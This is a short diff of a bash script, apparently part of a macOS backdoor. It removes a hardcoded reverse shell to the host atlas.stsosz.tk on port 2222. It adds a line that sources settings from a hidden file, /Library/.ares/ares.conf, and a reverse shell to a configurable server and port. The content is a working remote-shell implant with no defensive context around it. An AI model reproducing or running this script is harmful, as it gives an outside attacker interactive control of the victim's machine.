@@ -1,3 +1,4 @@
 #!/bin/bash
-bash -i >& /dev/tcp/atlas.stsosz.tk/2222 0>&1
+source /Library/.ares/ares.conf
+bash -i >& /dev/tcp/$SERVER/$PORT 0>&1
 wait
